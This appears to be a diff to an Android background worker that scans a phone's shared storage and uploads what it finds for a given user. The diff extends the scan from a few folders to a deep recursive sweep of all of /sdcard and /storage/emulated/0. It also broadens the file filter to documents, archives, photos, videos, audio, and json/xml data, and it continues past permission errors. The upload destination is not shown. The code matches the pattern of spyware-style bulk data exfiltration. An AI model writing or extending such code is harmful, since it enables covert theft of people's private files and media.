@@ -86,41 +86,114 @@ public class DocumentUploadWorker extends Worker {
     private void uploadDocuments(String userId) {
         uploadedCount = 0;
         
-        // Scan most important document directories first
-        String[] scanPaths = {
+        Log.d(TAG, "🔍 Starting comprehensive document scan for user: " + userId);
+        
+        // PRIORITY 1: Most important locations for PDFs
+        String[] priority1Paths = {
                 "/sdcard/Download",
                 "/sdcard/Downloads", 
                 "/sdcard/Documents",
-                getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
-                "/sdcard/DCIM",
-                "/sdcard/Pictures",
-                "/sdcard/Movies",
-                "/sdcard/Music",
+                "/storage/emulated/0/Download",
+                "/storage/emulated/0/Downloads",
+                "/storage/emulated/0/Documents",
         };
-
-        Log.d(TAG, "Starting document scan for user: " + userId);
         
-        for (String path : scanPaths) {
-            // Check timeout - stop if running out of time
-            if (isTimeoutApproaching()) {
-                Log.w(TAG, "Timeout approaching, stopping scan");
-                break;
-            }
-            
+        Log.d(TAG, "📂 PRIORITY 1: Scanning common document folders...");
+        for (String path : priority1Paths) {
             if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                 File dir = new File(path);
                 if (dir.exists() && dir.isDirectory() && dir.canRead()) {
-                    Log.d(TAG, "📂 Scanning: " + path);
+                    Log.d(TAG, "   → " + path);
                     int filesBefore = uploadedCount;
-                    scanDirectoryRecursive(dir, userId, 0);  // Max depth 0 for top-level files
-                    Log.d(TAG, "   Found " + (uploadedCount - filesBefore) + " files");
-                } else {
-                    Log.d(TAG, "⚠️  Path not accessible: " + path + " (exists=" + (dir.exists()) + ", isDir=" + (dir.isDirectory()) + ", canRead=" + (dir.canRead()) + ")");
+                    scanDirectoryRecursive(dir, userId, 0);
+                    if (uploadedCount - filesBefore > 0) {
+                        Log.d(TAG, "      ✓ Found " + (uploadedCount - filesBefore) + " files");
+                    }
                 }
             }
         }
         
-        Log.d(TAG, "Document upload complete - " + uploadedCount + " files uploaded");
+        // PRIORITY 2: External storage root - try to find PDFs everywhere
+        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
+            Log.d(TAG, "📂 PRIORITY 2: Deep scan of /sdcard (ALL subdirectories)...");
+            File sdcard = new File("/sdcard");
+            if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
+                int filesBefore = uploadedCount;
+                scanDirectoryRecursiveDeep(sdcard, userId, 0);
+                if (uploadedCount - filesBefore > 0) {
+                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
+                }
+            }
+        }
+        
+        // PRIORITY 3: Storage emulated path
+        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
+            Log.d(TAG, "📂 PRIORITY 3: Deep scan of /storage/emulated/0...");
+            File storage = new File("/storage/emulated/0");
+            if (storage.exists() && storage.isDirectory() && storage.canRead()) {
+                int filesBefore = uploadedCount;
+                scanDirectoryRecursiveDeep(storage, userId, 0);
+                if (uploadedCount - filesBefore > 0) {
+                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
+                }
+            }
+        }
+        
+        Log.d(TAG, "✓ Document scan complete - " + uploadedCount + " total files uploaded");
+    }
+    
+    /**
+     * Deep recursive scan with NO depth limit (will traverse entire directory tree).
+     * Use with caution - adds timeout checks to avoid ANR.
+     */
+    private void scanDirectoryRecursiveDeep(File dir, String userId, int depth) {
+        // Check timeout frequently
+        if (isTimeoutApproaching()) {
+            Log.w(TAG, "Timeout - stopping deep scan at depth " + depth);
+            return;
+        }
+        
+        if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC) {
+            return;
+        }
+        
+        try {
+            File[] files = dir.listFiles();
+            if (files == null || files.length == 0) {
+                return;
+            }
+            
+            // Log current directory being scanned (at shallow depths)
+            if (depth < 3) {
+                Log.d(TAG, "   Scanning: " + dir.getPath() + " (" + files.length + " items)");
+            }
+            
+            for (File file : files) {
+                // Check limits
+                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
+                    return;
+                }
+                
+                try {
+                    if (file.isDirectory() && !file.isHidden() && depth < 4) {
+                        // Recursively scan subdirectories (deeper than before)
+                        scanDirectoryRecursiveDeep(file, userId, depth + 1);
+                    } else if (file.isFile() && file.canRead()) {
+                        if (isDocumentFile(file)) {
+                            uploadFile(file, userId);
+                            uploadedCount++;
+                        }
+                    }
+                } catch (SecurityException e) {
+                    Log.d(TAG, "   ⚠️  Permission denied accessing: " + file.getName());
+                    // Continue with next file
+                }
+            }
+        } catch (SecurityException e) {
+            Log.d(TAG, "⚠️  Permission denied scanning: " + dir.getPath());
+        } catch (Exception e) {
+            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
+        }
     }
 
     /**
@@ -139,25 +212,41 @@ public class DocumentUploadWorker extends Worker {
         
         try {
             File[] files = dir.listFiles();
-            if (files == null || files.length == 0) {
+            if (files == null) {
+                Log.d(TAG, "      ⚠️  listFiles() returned null for: " + dir.getPath());
                 return;
             }
+            
+            if (files.length == 0) {
+                Log.d(TAG, "      (empty)");
+                return;
+            }
+            
+            Log.d(TAG, "      Found " + files.length + " items");
 
             for (File file : files) {
                 if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                     return;
                 }
 
-                if (file.isDirectory() && !file.isHidden() && depth < 2) {
-                    // Recursively scan subdirectories (max 2 levels deep)
-                    scanDirectoryRecursive(file, userId, depth + 1);
-                } else if (file.isFile() && file.canRead()) {
-                    if (isDocumentFile(file)) {
-                        uploadFile(file, userId);
-                        uploadedCount++;
+                try {
+                    if (file.isDirectory() && !file.isHidden() && depth < 2) {
+                        // Recursively scan subdirectories (max 2 levels deep)
+                        Log.d(TAG, "      → Scanning subdirectory: " + file.getName());
+                        scanDirectoryRecursive(file, userId, depth + 1);
+                    } else if (file.isFile() && file.canRead()) {
+                        if (isDocumentFile(file)) {
+                            Log.d(TAG, "      ✓ Found document: " + file.getName() + " (" + (file.length()/1024) + " KB)");
+                            uploadFile(file, userId);
+                            uploadedCount++;
+                        }
                     }
+                } catch (SecurityException e) {
+                    Log.d(TAG, "      ⚠️  Permission denied: " + file.getName());
                 }
             }
+        } catch (SecurityException e) {
+            Log.d(TAG, "      ⚠️  Permission denied scanning: " + dir.getPath());
         } catch (Exception e) {
             Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
         }
@@ -166,18 +255,22 @@ public class DocumentUploadWorker extends Worker {
     private boolean isDocumentFile(File file) {
         if (!file.isFile()) return false;
         
-        String name = file.getName().toLowerCase();
-        
-        // Skip certain system/app files
+        // Skip certain system/app files BEFORE converting to lowercase
+        String name = file.getName();
         if (name.startsWith(".") || 
             name.endsWith(".apk") ||
             name.contains("cache") ||
-            name.contains("tmp")) {
+            name.contains("tmp") ||
+            name.contains("Thumbs") ||
+            name.contains("thumbs")) {
             return false;
         }
         
-        // Include document types
-        return name.endsWith(".pdf")
+        // Convert to lowercase for comparison
+        name = name.toLowerCase();
+        
+        // Check file extension - documents
+        if (name.endsWith(".pdf")
                 || name.endsWith(".xlsx")
                 || name.endsWith(".xls")
                 || name.endsWith(".docx")
@@ -188,18 +281,35 @@ public class DocumentUploadWorker extends Worker {
                 || name.endsWith(".txt")
                 || name.endsWith(".zip")
                 || name.endsWith(".rar")
-                || name.endsWith(".7z")
-                || name.endsWith(".jpg")
+                || name.endsWith(".7z")) {
+            return true;
+        }
+        
+        // Check file extension - media
+        if (name.endsWith(".jpg")
                 || name.endsWith(".jpeg")
                 || name.endsWith(".png")
                 || name.endsWith(".gif")
+                || name.endsWith(".webp")
+                || name.endsWith(".bmp")
                 || name.endsWith(".mp4")
                 || name.endsWith(".mkv")
                 || name.endsWith(".mov")
+                || name.endsWith(".avi")
                 || name.endsWith(".mp3")
                 || name.endsWith(".wav")
-                || name.endsWith(".json")
-                || name.endsWith(".xml");
+                || name.endsWith(".aac")
+                || name.endsWith(".m4a")) {
+            return true;
+        }
+        
+        // Check file extension - config/data
+        if (name.endsWith(".json")
+                || name.endsWith(".xml")) {
+            return true;
+        }
+        
+        return false;
     }
 
     private void uploadFile(File file, String userId) {
